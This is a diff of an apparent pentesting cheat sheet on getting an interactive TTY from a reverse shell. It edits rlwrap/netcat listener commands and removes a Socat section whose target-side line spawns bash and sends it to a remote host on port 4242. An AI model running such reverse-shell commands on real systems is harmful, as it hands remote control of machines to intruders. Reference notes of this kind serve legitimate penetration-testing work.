@@ -72,33 +72,17 @@ $ stty rows <num> columns <cols>
 
 - Using the GNU readline wrapper with arrow keys. You can use this when using a normal reverse shell for penetrating Windows machine
 
-`user@pentestos:~$ rlwrap nc 192.168.0.115 80`
+`user@pentestos:~$ rlwrap nc <target_IP> <target_PORT>`
 
-`user@pentestos:~$ rlwrap -r -f . nc 192.168.0.115 4242`
+- `-f .` will make rlwrap use the current history file as a completion word list, and `-r` put all words seen on input and output on the completion list.
 
-- `-f .` will make rlwrap use the current history file as a completion word list.
+`user@pentestos:~$ rlwrap -r -f . nc <target_IP> <target_PORT>`
 
-- `-r` Put all words seen on input and output on the completion list.
-
-### 1.1.4 - Socat
-
-- Using `socat` to spawn a shell with interactive TTY
-
-- Attacker
-
-```
-user@pentestos:~$ socat file:`tty`,raw,echo=0 tcp-listen:4242
-```
-
-- Target
-
-`$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4242`
-
-### 1.1.5 - Expect
+### 1.1.4 - Expect
 
 Using `expect` to get a TTY
 
-```bash
+```
 #!/usr/bin/expect
 # Spawn a shell, then allow the user to interact with it.
 # The new shell will have a good enough TTY to run tools like ssh, su and login
